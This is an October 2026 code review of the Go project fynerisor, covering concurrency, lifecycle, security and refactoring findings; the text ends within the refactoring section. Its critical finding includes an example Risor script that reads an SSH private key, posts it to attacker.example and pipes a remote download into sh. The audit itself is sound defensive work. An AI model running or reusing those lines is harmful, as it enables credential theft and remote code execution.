# fynerisor Code Review — October 2026

**Scope:** fynerisor v0.9.0 at commit `b2b1478` (core, gui, modules, browser, both CLIs; examples only where they show API usage).
**Tracker:** [#48 — implementation tracker](https://github.com/uidbz/fynerisor/issues/48) · every finding has its own issue (label [`review-2026-10`](https://github.com/uidbz/fynerisor/labels/review-2026-10)).

This document has three jobs:

1. **Risk register.** Bugs and hazards, each with location, failure scenario and fix.
2. **Refactoring and simplification options.** How to remove whole classes of the bugs above, and a lot of code.
3. **Unix-philosophy assessment.** Where fynerisor does one thing well, works with other parts, and uses text streams, and where it does not.

`docs/IMPROVEMENTS.md` predates the repository extraction and is superseded by this file (see [§10](#10-documentation)).

---

## Contents

1. [Summary](#1-summary)
2. [Method and severity scale](#2-method-and-severity-scale)
3. [Architecture overview — the central problem](#3-architecture-overview)
4. [Risky areas and bugs](#4-risky-areas-and-bugs)
   - 4.1 [Security](#41-security)
   - 4.2 [Lifecycle](#42-lifecycle)
   - 4.3 [Concurrency](#43-concurrency)
   - 4.4 [Correctness bugs](#44-correctness-bugs)
   - 4.5 [Error conventions](#45-error-conventions)
5. [Duplication and dead code](#5-duplication-and-dead-code)
6. [Refactoring options](#6-refactoring-options)
7. [Simplification options (ranked)](#7-simplification-options-ranked)
8. [Unix philosophy assessment](#8-unix-philosophy-assessment)
9. [Testing](#9-testing)
10. [Documentation](#10-documentation)
11. [Roadmap](#11-roadmap)
12. [Appendix: finding index](#12-appendix-finding-index)

---

## 1. Summary

### Health snapshot

| Check | Result |
|---|---|
| `go build ./...` | ✅ |
| `go vet ./...` | ✅ clean |
| `go test ./...` | ✅ all packages pass |
| `go test -race ./core` | ✅ |
| `go test -race ./gui` | ❌ **16 tests fail, 33 `DATA RACE` reports** ([#15](https://github.com/uidbz/fynerisor/issues/15)) |
| Size | ≈25k lines of non-example Go; ≈99 Risor wrapper types; 44 examples |

The project has a clear purpose, a sensible package split (`core` without GUI dependencies, `gui` on top), good godoc, many examples, and careful post-mortems in `docs/CONCURRENCY.md`. Its weaknesses all come from one place: **the single-threaded Risor VM is entered from four different execution contexts with four different disciplines.** Each new widget picks one by copy-and-paste. Most high-severity findings are symptoms of that, and one refactor fixes most of them ([R2 / #37](#r2)).

### Top 10

| # | Severity | Finding | Issue |
|---|---|---|---|
| 1 | Critical | fynerisor-browser runs remote scripts with `os` + `http` → any page can read, delete and exfiltrate local files, or run commands | [#7](https://github.com/uidbz/fynerisor/issues/7) |
| 2 | High | `Stop()` / re-`Execute()` cannot cancel a script: the run's `ctx` never reaches `risor.Eval` | [#9](https://github.com/uidbz/fynerisor/issues/9) |
| 3 | High | UI freezes for good after 10 clicks if the main body errored, is still running, or after `Stop()` | [#10](https://github.com/uidbz/fynerisor/issues/10) |
| 4 | High | `Entry.OnChanged` and binding listeners call into the VM from a **new goroutine per event** | [#11](https://github.com/uidbz/fynerisor/issues/11) |
| 5 | High | ~29 callback sites bypass panic recovery and the VM guard | [#12](https://github.com/uidbz/fynerisor/issues/12) |
| 6 | High | `-race` fails; `Window.Status`, `LoadScript`, `content.Objects` race | [#15](https://github.com/uidbz/fynerisor/issues/15) |
| 7 | High | CLI aborts on top-level `import(...)` lines (calls the removed `ImportScript`) | [#22](https://github.com/uidbz/fynerisor/issues/22) |
| 8 | High | GUI `import()` of a URL returning 404/500 silently yields an empty module | [#19](https://github.com/uidbz/fynerisor/issues/19) |
| 9 | High | `CaptureStdout` hijacks the process-wide `os.Stdout` (never restored, leaks pipes, panics) | [#24](https://github.com/uidbz/fynerisor/issues/24) |
| 10 | High | `core` and `gui` each keep their own copy of options/require/import/runner, and the copies have drifted (bugs fixed in one, not the other) | [#32](https://github.com/uidbz/fynerisor/issues/32) |

Totals: **41 findings**. 1 critical, 12 high, 21 medium, 7 low.

### Recommended direction (one paragraph)

Build **one runtime type in `core`** that owns the environment, modules, imports, I/O streams, cancellation and a **per-runtime VM executor**. `gui.Window` then *composes* this runtime with a Fyne host instead of re-implementing it. Every widget callback goes through one helper (`rt.Callback(ctx, fn)`). Every wrapper type gets its methods from Risor's own `object.AttrRegistry` instead of hand-written `switch` statements. Modules become small orthogonal tools (`io` moves bytes, `json`/`csv` transform text, `exec` runs processes), and the CLI becomes a set of small commands (`run`, `check`, `analyze`, `docs`) with exit codes and stderr diagnostics. That is the Unix idea applied here: small parts with explicit inputs and outputs, so that their relationships — not any single part — give the power.

---

## 2. Method and severity scale

**Read in full:** `core/*`, `core/db`, `gui/window.go`, `gui/options.go`, `gui/import.go`, `gui/require.go`, `gui/scriptrunner.go`, `gui/safecall.go`, `gui/vmguard`, `gui/guithread`, `gui/canvas_object.go`, `gui/app_object.go`, `gui/fyne.go`, `gui/widget.go`, `gui/clipboard.go`, `gui/shortcut.go` (part), `gui/container.go` (part), `gui/dialog.go` (part), `gui/widget/{button,log,list,table,entry,tree,menuitem,interfaces}.go`, `gui/binding/string.go`, `modules/{os,exec,io,http,json,csv,sql,tie}` (main files), `browser/{browser,risor}.go`, `cmd/fynerisor/main.go`, `cmd/fynerisor-browser/main.go`, `docs/CONCURRENCY.md`, `docs/IMPROVEMENTS.md`. Risor v2.2.0 sources were read for `object.Object`, `AttrRegistry`, `Error`, `vm.WithGlobals` and context handling.

**Run:** `go vet ./...`, `go test ./...`, `go test -race -count=1 ./core ./gui`, plus `grep` surveys (counts quoted below are from those).

**Not covered in depth:** `gui/chart/*` (self-contained renderer with its own tests), `gui/widget/tablewidget/flextable.go` internals, the tie client beyond its object wrapper, and visual behaviour (nothing was run interactively).

| Severity | Meaning |
|---|---|
| **Critical** | Exploitable now, or loses user data. Fix before the next release. |
| **High** | Crash, freeze, silent wrong result, or a data race in normal use. |
| **Medium** | Wrong behaviour in less common paths, maintainability hazards that keep producing bugs, missing safety rails. |
| **Low** | Cleanup, consistency, dead code. |

Each finding is labelled with a key (S = security, L = lifecycle, C = concurrency, B = bug, E = errors, D = duplication, R = refactor, U = Unix, T = tests, DOC = docs) that matches the issue and the HTML anchor in this file. Refactoring options R1, R4 and R7 ([§6](#6-refactoring-options)) have no issue of their own; they are tracked by D1 ([#32](https://github.com/uidbz/fynerisor/issues/32)), B7 ([#24](https://github.com/uidbz/fynerisor/issues/24)) and B6 ([#23](https://github.com/uidbz/fynerisor/issues/23)).

---

## 3. Architecture overview

```
              ┌────────────────────────── cmd/fynerisor, cmd/fynerisor-browser
              │                               │
              ▼                               ▼
          browser ──────────────► gui ───────────────┐
                                   │  window.go (runtime + host + I/O + menus + shortcuts)
                                   │  options/require/import/scriptrunner (copies of core)
                                   │  widget/ container/ canvas/ chart/ dialog/ binding/
                                   │  guithread (main-goroutine detection), vmguard (global)
                                   ▼
                                  core ── options/require/import/scriptrunner/analyze/batch
                                   │
                                   ▼
                                modules (os, exec, io, http, json, csv, sql, tie, time, …)
```

The package layering is sound: `core` does not import `gui`, and the CLAUDE.md rules are respected. Two structural problems sit on top of it:

1. **`gui` duplicates `core` instead of composing it** ([D1 / #32](#d1)).
2. **`gui.Window` is a god object.** It is at once the script runtime (env, modules, import cache, runner), the Fyne host adapter (content, drop handler, shortcuts, main menu, resize), the I/O layer (stdout capture), the callback scheduler (`functionCalls`), and a Risor object (`window` global). A `CanvasObject` is a `Window` without a window, so a third of the `window.*` methods have to check `w.FyneWindow == nil`.

### The central problem: four ways into one VM

Risor's VM is single-threaded. Today it is entered from:

| Context | What runs there | How it enters the VM | Guard |
|---|---|---|---|
| **Execute goroutine** | the main script body | `risor.Eval(context.Background(), …)` | none |
| **`functionCalls` loop goroutine** (`gui/window.go:379-388`) | `w.Do` handlers: `widget.NewButton/NewCheck/NewSelect/…`, dialogs, `MenuItem`, `OnSubmitted` | `safeCall` → `vmguard.Call`, *or* raw `callFunc` (MenuItem, Entry.OnSubmitted) | partial |
| **Fyne UI thread** | List/Table getters, Tree/GridWrap getters, `Button.OnTapped`, `Entry.Validator`, `window.Do`/shortcuts (via `guithread.Do`) | `vmguard.Call` (List/Table) or raw `callFunc` (Tree, GridWrap, Button.OnTapped, …) | partial |
| **New goroutines** | `go()`, `Entry.OnChanged`, binding listeners | `safeCall` (go) or raw `callFunc` | none for OnChanged/bindings |

`docs/CONCURRENCY.md` records two production incidents caused by exactly this (Tree/List stack underflow; `go()` + stdout capture). Each fix was local to one entry path, so the class of bug is still present ([#11](#c2), [#12](#c3), [#16](#c7), [#17](#c8)). Three more design facts make it worse:

- `vmguard` is **process-global** ([#13](#c4)), but there is one VM per Window.
- The `functionCalls` channel is a **bounded buffer drained only after the main body succeeds** ([#10](#c1)).
- The run's context is **not connected** to the VM ([#9](#l1)).

[R2 / #37](#r2) proposes one executor per runtime that all four contexts must use.

---

## 4. Risky areas and bugs

### 4.1 Security

<a id="s1"></a>
#### S1 — Browser runs remote scripts with `os` + `http` · Critical · [#7](https://github.com/uidbz/fynerisor/issues/7)

`cmd/fynerisor-browser/main.go:117-121` enables `WithHTTP()` and `WithOS()` for every page. The comment there says the IO module is left out "for security (provides file system write access)". But `modules/os` already provides `read_file`, `write_file`, `create`, `copy_file`, `remove_all`, `mkdir`, `mkdir_all` and `exec` (`modules/os/os.go:27-45`).

```risor
// served from any web page the user opens
let secret = os.read_file(os.home_dir() + "/.ssh/id_ed25519")
http.post("https://attacker.example/c", {}, string(secret))
os.exec("sh", "-c", "curl -s https://attacker.example/p | sh")
```

There is no prompt, no origin policy, and no capability split. **Fix now:** remove `WithOS()` from the browser. **Fix properly:** capability presets ([R6 / #40](#r6)) chosen per origin by the host, which is policy kept separate from mechanism.

<a id="s2"></a>
#### S2 — `import()` path resolution and policy · High · [#8](https://github.com/uidbz/fynerisor/issues/8)

`loadImportSource` (`core/import.go:173-185`, `gui/import.go:183-195`) reads any non-URL path relative to the **process CWD**:

- `fynerisor apps/app.risor` where the script calls `import("lib.risor")` resolves `./lib.risor`, not `apps/lib.risor`.
- A remote page at `https://host/app/index.risor` calling `import("lib.risor")` reads a **local** file. It can also import absolute local paths.
- The cache key is the raw string, so `"./a.risor"` and `"a.risor"` give two module instances with two separate VMs.

Fix: carry the importer's base (directory or URL) in the import context, resolve with `filepath.Join` / `url.ResolveReference`, canonicalise the cache key, and enforce same-origin for remote scripts.

### 4.2 Lifecycle

<a id="l1"></a>
#### L1 — Execution can't be cancelled · High · [#9](https://github.com/uidbz/fynerisor/issues/9)

```go
// gui/window.go:350-360
ctx, cancel := context.WithCancel(context.Background())
w.cancelExec = cancel
...
go func() {
    result, err := w.runner.Eval()          // ← ctx not passed
// gui/scriptrunner.go:44-48
func (sr *ScriptRunner) Eval() (any, error) {
    ctx := context.Background()
    result, err := risor.Eval(ctx, sr.script, sr.globals...)
```

Risor's VM checks `ctx.Done()` (`risor/v2/pkg/vm/vm.go:285,489-502`), so passing the context through is all that's needed. Today `Stop()` only stops the callback loop. The VM keeps running, and so do its closures, captured with a Background-derived ctx. Browser navigation, `--watch` reloads and `CanvasObject.Stop()` all leak the previous VM. Risor also offers `WithTimeout` and `WithMaxSteps`, which could be exposed for headless runs.

### 4.3 Concurrency

<a id="c1"></a>
#### C1 — UI freeze on the `functionCalls` channel · High · [#10](https://github.com/uidbz/fynerisor/issues/10)

```go
// gui/widget.go:780
func (w *Window) Do(fn func()) { w.functionCalls <- fn }   // called from Fyne's UI thread

// gui/window.go:356-389 — buffer 10, drained only after a successful main body
callChan := make(chan func(), 10)
go func() {
    result, err := w.runner.Eval()
    if err != nil { ...; return }                        // ← loop never starts
    ...
    for { select { case <-ctx.Done(): return; case x := <-callChan: x() } }
}()
```

| Trigger | Result |
|---|---|
| Main body raises after building the UI | 11th interaction anywhere → **permanent freeze** |
| Main body still running (slow HTTP after `SetContent`) | freeze until it finishes |
| `Stop()` with widgets still visible | freeze after 10 interactions |
| `w.Do` before the first `Execute` | send on nil channel → blocks forever |

<a id="c2"></a>
#### C2 — Raw goroutines into the VM · High · [#11](https://github.com/uidbz/fynerisor/issues/11)

```go
// gui/widget/entry.go:206-210
obj.instance.OnChanged = func(text string) {
    go func() { callFunc(ctx, fn, []object.Object{object.NewString(text)}) }()
}
// gui/binding/string.go:116-122 (int/float/bool identical)
listener := binding.NewDataListener(func() {
    go func() { _, err := callFunc(ctx, fn, nil); ... }()
})
```

Each keystroke or binding change starts a goroutine that runs VM bytecode at the same time as the others, the loop goroutine and UI-thread getters. This is the same corruption that `docs/CONCURRENCY.md` documents, and events can be handled out of order. A panic in such a goroutine kills the process.

<a id="c3"></a>
#### C3 — Unguarded direct `callFunc` sites · High · [#12](https://github.com/uidbz/fynerisor/issues/12)

About 29 sites call `callFunc(ctx, fn, …)` directly, without `safeCall` (recover) or `vmguard` (detection). Examples: `gui/widget/button.go:180` (`OnTapped`), `tree.go:93,131,155,191,216,237`, `gridwrap.go:122,155,192,222,246`, `menuitem.go:62`, `markdown.go:142`, `selectentry.go:177`, `dateentry.go:163`, `slider.go:120`, `hyperlink.go:135`, `calendar.go:110`, `entry.go:185,209,233`, `table.go:222`, `chart/interact.go:256`, `binding/*.go`.

The same widget can reach the VM by two different paths: `widget.NewButton("x", f)` goes through `w.Do` + `safeCall` on the loop goroutine, while `btn.OnTapped(f)` calls `callFunc` directly on the UI thread.

<a id="c4"></a>
#### C4 — Global vmguard · Medium · [#13](https://github.com/uidbz/fynerisor/issues/13)

`gui/vmguard/vmguard.go:46-50` keeps `owner`/`depth` as package variables. Two `CanvasObject`s in one host, each with its own VM, reject each other's callbacks (`ErrConcurrentAccess`) and render stale table data. A rejected *event* is simply lost. Every guarded call also runs `runtime.Stack` to find the goroutine ID, and that includes render getters called many times per frame.

<a id="c5"></a>
#### C5 — `guithread.SetMain()` on every window · Medium · [#14](https://github.com/uidbz/fynerisor/issues/14)

`newWindow` (`gui/window.go:154`) and `NewApp` (`:67`) overwrite the global "main goroutine" with the *caller's* goroutine. If a host builds an embedded view from a background goroutine, `guithread.Do` starts running Fyne calls inline on that goroutine. That is a thread violation, and calls from the real UI thread then get re-queued.

<a id="c6"></a>
#### C6 — Data races (`-race` fails) · High · [#15](https://github.com/uidbz/fynerisor/issues/15)

`go test -race -count=1 ./gui` → 16 failing tests, 33 reports. The main ones:

| Location | Race |
|---|---|
| `gui/window.go:290` | `Window.Status` written by the Execute goroutine, read by `CanvasObject.Status()`, the CLI poll and tests |
| `gui/scriptrunner.go:27` | `LoadScript` writes `sr.script` while the previous Execute goroutine reads it (the browser does this on every navigation) |
| `gui/window.go:509-510` | `SetContent` writes `content.Objects` from the script goroutine |
| `gui/window.go:277-283`, `gui/widget/label.go:156` | `go()` worker vs widget state |

<a id="c7"></a>
#### C7 — Stale callbacks after re-Execute · Medium · [#16](https://github.com/uidbz/fynerisor/issues/16)

Callbacks read `w.functionCalls` when they fire. After a new `Execute`, closures belonging to the **old** VM are run by the **new** loop. Because of [L1](#l1), the old VM may still be running its main body, and that is two goroutines in one VM. Shortcuts (`AddShortcut`) and main menus (`SetMainMenu`) registered by an old run are never removed.

<a id="c8"></a>
#### C8 — `go()` on a shared VM · Medium · [#17](https://github.com/uidbz/fynerisor/issues/17)

`go(fn)` (`gui/window.go:260-286`) is concurrency on a VM that cannot support it. vmguard turns the corruption into errors and lost callbacks, but it does not make it work. Options: serialize `go()` through the executor, or (recommended) provide Go-side async primitives (`http.get_async(url, cb)`, `exec.start(cmd, {on_line})`, `time.after(ms, cb)`) where Go does the concurrent I/O and the script only handles the resulting events.

### 4.4 Correctness bugs

<a id="b1"></a>
#### B1 — `clipboard.Read()` returns `""` off the UI thread · High · [#18](https://github.com/uidbz/fynerisor/issues/18)

```go
// gui/clipboard.go:86-90
var content string
guithread.Do(func() { content = fyne.CurrentApp().Clipboard().Content() })  // async off-main
return object.NewString(content), nil                                      // still ""
```

The main body and `w.Do` handlers do not run on the UI thread, so this always returns `""` there, and the late write is a data race. Fix: a `guithread.DoAndWait` for reads, used by every getter that reads Fyne state.

<a id="b2"></a>
#### B2 — GUI HTTP import swallows non-200 · High · [#19](https://github.com/uidbz/fynerisor/issues/19)

`gui/scriptrunner.go:70-72` contains `if resp.StatusCode != http.StatusOK { return "", err }` where `err` is `nil`. A 404 imports an empty module. The core copy (`core/import.go:195-197`) gets this right, and the divergence is a direct result of [D1](#d1). Neither copy sets a timeout or a size limit.

<a id="b3"></a>
#### B3 — `require("@")` panic and wrong hints · Medium · [#20](https://github.com/uidbz/fynerisor/issues/20)

`strings.ToUpper(moduleName[:1])` (`core/require.go:55`, `gui/require.go:56`) panics on `"@"`. The suggested option names are wrong: `WithHttp` (real: `WithHTTP`), `WithSql`, `WithJson`, `WithCsv`, `WithIo`, `WithHttpimport`, and `WithMyapi` for host-provided globals. The GUI message also uses the old `fynerisor.` package prefix.

<a id="b4"></a>
#### B4 — `widget.NewForm` list branch · Medium · [#21](https://github.com/uidbz/fynerisor/issues/21)

`gui/widget.go:347`: `object.AsList(args[0])` inside `for i, x := range args` should be `x`. With `NewForm(a, [b, c])` the call fails; with `NewForm([a, b], [c])` the result is `a, b, a, b`.

<a id="b5"></a>
#### B5 — CLI calls the removed `ImportScript` · High · [#22](https://github.com/uidbz/fynerisor/issues/22)

`cmd/fynerisor/main.go:181-196` calls `ImportScript` for every `reqs.Imports` entry. That method always returns an error (`gui/window.go:329-331`), so any script with a line starting `import(` makes the CLI exit with `log.Fatalf`. This goes unnoticed only because of [B6](#b6). Fix: delete the loop.

<a id="b6"></a>
#### B6 — `AnalyzeRequirements` is line-based · Medium · [#23](https://github.com/uidbz/fynerisor/issues/23)

`core/analyze.go:105-119` evaluates each line that *starts* with `require(` or `import(`, which causes four problems:

- It misses `let m = import(...)`, the documented idiom.
- It misses `require([...])` spread over several lines.
- It *executes* the expressions it does pick up.
- It never returns an error.

Risor ships `pkg/parser` and `pkg/ast`. Walk the call expressions, accept literal arguments, report non-literals as dynamic, and return parse errors with line numbers. (Planning item R7 is merged into this issue.)

<a id="b7"></a>
#### B7 — `CaptureStdout` hijacks `os.Stdout` · High · [#24](https://github.com/uidbz/fynerisor/issues/24)

`gui/window.go:783-860` assigns `os.Stdout = writer` for the **whole process**:

- It never restores the original.
- Each call creates a new pipe plus two goroutines, and the old pipe leaks.
- It runs `panic(err)` if `os.Pipe` fails.
- It captures the host's and every library's output, and two embedded views fight over it.

The only output that needs capturing is our own `print` builtin (`gui/window.go:249-258`), so the fix is a writer, not a pipe. Planning item R4 is merged into this issue and described in [§6](#r4-io-writer).

<a id="b8"></a>
#### B8 — HTTP: no ctx, client per request, no import timeout · Medium · [#25](https://github.com/uidbz/fynerisor/issues/25)

- `modules/http/http.go:338-339` uses `http.NewRequest` without a ctx; the leftover debug comment there says "Try without context to see if that's the issue".
- `:361` creates a new `http.Client` per request.
- Bodies are read whole and converted to `string`, so binary content is mangled and there is no size limit.
- The auth/header option parsing is pasted five times.
- `response.json` is attached by mutating the Go map after `object.NewMap` was called.
- Imports use `http.Get` with the default client, which has **no timeout** (`core/import.go:189`, `gui/window.go:884`, `gui/scriptrunner.go:64`).

<a id="b9"></a>
#### B9 — SQL ignores ctx · Low · [#26](https://github.com/uidbz/fynerisor/issues/26)

`modules/sql/db.go:111` uses `Exec`/`Query` instead of `ExecContext`/`QueryContext`. Note also that `mattn/go-sqlite3` is cgo, so `core/db` is not statically linkable as the `core` package doc implies.

<a id="b10"></a>
#### B10 — Module compile/run environment mismatch · Medium · [#27](https://github.com/uidbz/fynerisor/issues/27)

Modules are compiled with `cb.globals` (env **plus** opaque `WithRisorOptions`) but run with `vm.WithGlobals(cb.env)` only (`core/import.go:96-104`, `gui/import.go:95-107`). The CLI's `args` and `--globals` JSON are passed via `WithRisorOptions`. Modules referencing them compile, but the name is missing from the module VM. Needs a regression test to pin down the exact symptom. Recommended fix: named values always go through `WithGlobal`, and `WithRisorOptions` is only for VM tuning.

<a id="b11"></a>
#### B11 — Browser: auth, blocking navigation, string errors · Medium · [#28](https://github.com/uidbz/fynerisor/issues/28)

- `ShowAuthDialog` (`cmd/fynerisor-browser/main.go:299-336`) returns before the user can type, so Basic auth never works.
- `err.Error() == "Unauthorized"` (`browser/browser.go:190`) compares strings instead of using a sentinel error.
- The fetch runs synchronously on the UI thread when triggered from the toolbar or address bar, so the window can freeze for up to 30 s.
- `lastErrorShown` is never reset.
- The load/execute/history block is duplicated in `navigate` and `showAuthDialog`.
- `CopyToClipboard` runs off the UI thread.

<a id="b12"></a>
#### B12 — CLI headless/watch/options · Medium · [#29](https://github.com/uidbz/fynerisor/issues/29)

- Headless mode polls the racy `Status` string with a hard-coded 30 s limit, through the Fyne test driver (`cmd/fynerisor/main.go:206-219`).
- `--watch` stacks VMs ([L1](#l1)) and stops working after editors' rename-on-save.
- The option list is duplicated for verbose and non-verbose modes (`:140-179`).
- Script args are exposed twice: through the `os.SetScriptArgs` global and an `args` global.

### 4.5 Error conventions

<a id="e1"></a>
#### E1 — Error *values* vs raised errors · Medium · [#30](https://github.com/uidbz/fynerisor/issues/30)

In Risor v2, `return object.Errorf(...), nil` hands the script an error **value** and execution continues. `return nil, err` **raises**. The codebase mixes the two:

- ~375 arity checks in `gui/` and `modules/` return values.
- `object.AsString` failures are usually raised.
- `modules/os` returns error values for I/O failures, while `modules/io` and `modules/exec` raise them.
- 54 files' `RunOperation` return *both*, e.g. `gui/window.go:459-463`.

```risor
let b = widget.NewButton("Save")   // arity error → b is an *error value*
window.SetContent(b)               // fails here: "expected IsCanvasObject, got error"
```

Rule of Repair: fail noisily and early. Proposal: programmer errors (arity, type, unknown attr) are raised. Expected runtime failures follow one documented convention per module. `AttrRegistry` ([R3](#r3)) raises arity errors automatically.

<a id="e2"></a>
#### E2 — Library diagnostics on stdout · Medium · [#31](https://github.com/uidbz/fynerisor/issues/31)

41 non-test `fmt.Print*` calls in `gui/`, `modules/` and `browser/` write errors to **stdout**, for example `gui/widget.go:112,711`, `gui/widget/list.go:124-167` and `gui/binding/*.go`. This has three consequences:

- It corrupts pipelines like `fynerisor x.risor | jq`.
- It shows up inside a user's `CaptureStdout` log widget.
- Hosts can't redirect it.

Fix: a per-runtime error sink, `WithErrorHandler(func(error))`, which defaults to the runtime's stderr.

---

## 5. Duplication and dead code

<a id="d1"></a>
### D1 — `gui` re-implements `core` · High (maintenance) · [#32](https://github.com/uidbz/fynerisor/issues/32)

| Concern | core | gui | Drift already present |
|---|---|---|---|
| Options | `core/options.go` (375 lines) | `gui/options.go` (450 lines) | gui still links all SQL drivers; core moved them to `core/db` |
| `require()` | `core/require.go` (156) | `gui/require.go` (157) | same bugs in both ([B3](#b3)) |
| `import()` | `core/import.go` (205) | `gui/import.go` (197) | gui's HTTP fetch is broken ([B2](#b2)) |
| Runner | `core/scriptrunner.go` (56) | `gui/scriptrunner.go` (80) | identical apart from the broken fetch |
| Runtime state | `core.Context` fields | `gui.Window` fields | `env`, `userGlobals`, `enabledModules`, `moduleCache`, `importStack`, `moduleMutex` |
| Script loading | `core/import.go:loadImportSource` | `gui/import.go:loadImportSource`, plus unused `gui/window.go:862-900` | three loaders |

`gui.Option` and `core.Option` are unrelated interfaces, so a host cannot define its module set once and use it for both a headless run and a GUI run. The fix is [R1](#r1).

<a id="d2"></a>
### D2 — Dead code · Low · [#33](https://github.com/uidbz/fynerisor/issues/33)

- **`Cost() int` ×43.** Not part of the Risor v2 `object.Object` interface (`risor/v2/pkg/object/object.go:66-96`); a v1 leftover.
- **`MarshalJSON()` ×94.** Almost all only return "unable to marshal".
- **Always-failing deprecated stubs.** `core.Context.ImportScript`, `core.Context.EvalWithImports`, `gui.Window.ImportScript`. Doc comments still tell readers to call `ImportScript` before `LoadScript`.
- **Unused or degenerate code:**
  - `loadScriptFromPath/File/URL` (`gui/window.go:862-900`), never called
  - `createVMOptions`, which can't fail
  - `App.String`
  - the `window.Canvas` attribute, which returns the window itself
- **Duplicates:** `IsCanvasObject` is defined in both `gui/window.go:476` and `gui/widget/interfaces.go:12`; `goroutineID` is implemented twice, with different parsers.

<a id="d3"></a>
### D3 — Converters · Low · [#34](https://github.com/uidbz/fynerisor/issues/34)

`modules/http/http.go:441-515` and `modules/json/json.go:142-218` are copy-pasted and have already diverged (only json handles `nil`). JSON integers come back as floats. Use `object.FromGoType` / `obj.Interface()` and `json.Decoder.UseNumber()`.

<a id="d4"></a>
### D4 — Second clipboard stack · Low · [#35](https://github.com/uidbz/fynerisor/issues/35)

`gui/widget/tablewidget/clipboard_desktop.go` uses `golang.design/x/clipboard` (cgo, X11 headers) while everything else uses Fyne's clipboard.

<a id="d5"></a>
### D5 — Small inconsistencies · Low · [#36](https://github.com/uidbz/fynerisor/issues/36)

- `NewMuliLineEntry` typo (`gui/widget.go:329`).
- Copy-pasted `"button (%s): unable to get call function"` messages in checks, selects, `CaptureStdout`, `OnDropped` and `OnSubmitted`.
- `want=2` messages on functions that take 1 argument (`entry.go:171`) or 5 (`container.go:91`).
- `NewAccordionItem` ignores its `detail` argument.
- `NewCalendar` silently falls back to `time.Now()`.
- Duplicated doc blocks (`gui/widget.go:19-45`, `gui/container.go:19-44`) and a misplaced comment (`gui/window.go:766-770`).

### Volume of boilerplate (input to [R3](#r3))

| Pattern | Count |
|---|---|
| Types implementing `Type() object.Type` (gui, core, modules, browser) | 99 |
| `MarshalJSON()` implementations | 94 |
| `Attrs()` implementations in gui returning `nil` | 81 of 88 |
| `"wrong number of arguments"` checks | ~375 |
| `object.GetCallFunc` blocks in gui | ~65 |
| Files where `RunOperation` returns both an object and an error | 54 |
| `Cost()` implementations | 43 |

---

## 6. Refactoring options

Each option has a sketch, effort, risk, payoff, and the findings it resolves. They are ordered by dependency, not size.

<a id="r1"></a>
### R1 — One runtime in `core`, composed by `gui` → [#32](https://github.com/uidbz/fynerisor/issues/32)

```go
// core/runtime.go
type Runtime struct {
    env       map[string]any
    modules   map[string]bool
    imports   *importer          // cache, cycle detection, base-relative resolution, policy
    stdin     io.Reader
    stdout    io.Writer
    stderr    io.Writer
    onError   func(error)
    exec      *Executor          // R2
    appName   string
    appVer    string
    scriptArgs []string
}
func NewRuntime(opts ...Option) *Runtime
func (r *Runtime) Compile(ctx context.Context, src Source) error
func (r *Runtime) Run(ctx context.Context, src Source) (object.Object, error)
func (r *Runtime) SetGlobal(name string, v any)   // replaces Window.RegisterGlobal
type Source struct{ Code, Name, Base string }    // Base = dir or URL, for imports and errors

// core.Context remains as a thin wrapper for compatibility.

// gui/window.go
type Window struct {
    rt      *core.Runtime
    host    fyne.Window          // nil for CanvasObject
    content *fyne.Container
}
func NewWindow(w fyne.Window, opts ...Option) *Window  // gui.Option = core.Option + gui-only options
```

- **Effort:** M–L. **Risk:** M; the public API of `gui` can stay source-compatible except for removed stubs.
- **Payoff:** ≈900 lines removed, one place for import/require/HTTP fixes, identical semantics headless and in the GUI.
- **Resolves / enables:** #19, #20, #25, #27, #44, #8.

<a id="r2"></a>
### R2 — A VM executor per runtime → [#37](https://github.com/uidbz/fynerisor/issues/37)

```go
// core/executor.go (no GUI dependency)
type Executor struct {
    mu      sync.Mutex
    owner   atomic.Uint64      // or a ctx marker for reentrancy without runtime.Stack
    ready   chan struct{}      // closed when the main body has finished
    ctx     context.Context    // cancelled by Stop
    onError func(error)
}
// Invoke: event callbacks. Waits for the main body and for other callbacks, recovers panics.
func (e *Executor) Invoke(ctx context.Context, fn object.Callable, args ...object.Object) (object.Object, error)
// TryInvoke: render getters. Never blocks; the caller keeps its last-known value on contention.
func (e *Executor) TryInvoke(ctx context.Context, fn object.Callable, args ...object.Object) (object.Object, bool, error)

// gui helper used by every widget
func (w *Window) Callback(ctx context.Context, fn object.Object) (func(args ...object.Object) (object.Object, error), error)
```

Widget code then looks the same everywhere:

```go
case "OnChanged":
    cb, err := obj.rt.Callback(ctx, args[0])
    if err != nil { return nil, err }
    obj.instance.OnChanged = func(s string) { cb(object.NewString(s)) }
```

- The `functionCalls` channel, the loop goroutine, `Window.Do`, the global vmguard and the `go func(){callFunc…}` sites all go away.
- **Deadlock analysis:** events run on the UI thread and may wait for the lock. The lock holder (main body or a handler) must never wait synchronously for the UI thread. That already holds, because `guithread.Do` is asynchronous off-main. Reads that need the UI thread ([B1](#b1)) use `DoAndWait` only when **not** holding the lock, or else read inline when already on main.
- **Effort:** M. **Risk:** M; migrate one widget at a time and add a `-race` test per widget.
- **Resolves:** #10, #11, #12, #13, #16, most of #15, and the decision in #17.

<a id="r3"></a>
### R3 — Wrapper boilerplate → [#38](https://github.com/uidbz/fynerisor/issues/38)

Risor v2 already has `object.AttrRegistry[T]` (`risor/v2/pkg/object/attr_registry.go`). It provides argument-count validation with correct, raised errors, `AttrSpec` docs (args and return types) for `Attrs()`, and properties via `Getter`.

```go
// gui/widget/base.go
type base[T fyne.CanvasObject] struct{ instance T; typ object.Type }
func (b *base[T]) Type() object.Type            { return b.typ }
func (b *base[T]) Inspect() string              { return string(b.typ) }
func (b *base[T]) Interface() any               { return b.instance }
func (b *base[T]) IsTruthy() bool               { return true }
func (b *base[T]) Equals(o object.Object) bool  { return any(b) == any(o) }
func (b *base[T]) CanvasObject() fyne.CanvasObject { return b.instance }
func (b *base[T]) RunOperation(op.BinaryOpType, object.Object) (object.Object, error) {
    return nil, fmt.Errorf("type error: unsupported operation for %s", b.typ)
}

// shared CanvasObject attributes for every widget
func addCanvasObjectAttrs[W interface{ CanvasObject() fyne.CanvasObject }](r *object.AttrRegistry[W]) {
    r.Define("Show").Doc("Show the object").Impl(func(w W, _ context.Context, _ ...object.Object) (object.Object, error) {
        guithread.Do(w.CanvasObject().Show); return object.Nil, nil })
    r.Define("Hide").Doc("Hide the object").Impl(/* … */)
    r.Define("Refresh").Impl(/* … */)
    r.Define("Resize").Args("width", "height").Impl(/* … */)
    r.Define("Visible").Getter(func(w W) object.Object { return object.NewBool(w.CanvasObject().Visible()) })
}
```

